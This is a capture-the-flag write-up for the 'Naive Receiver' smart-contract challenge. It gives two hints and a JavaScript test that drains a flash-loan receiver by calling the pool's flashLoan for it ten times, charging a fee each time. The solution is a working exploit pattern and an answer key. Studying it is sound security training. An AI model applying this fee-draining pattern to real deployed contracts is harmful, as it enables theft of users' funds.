# 2 - Naive Receiver

### Hints

<details>

<summary>Hint One</summary>

Carefully walk through the logic of calling a flash loan on behalf of the receiver contract.

</details>

<details>

<summary>Hint Two</summary>

How does the receive contract afford these expensive transaction fees?

</details>

### Scripted Solution

```javascript
it('Exploit', async function () {
  // Borrow 0 tokens to receiver (charging a 1 ether fee each time)
  for (let i = 0; i < 10; i++) {
    await this.pool.flashLoan(this.receiver.address, 0)
  }
})
```
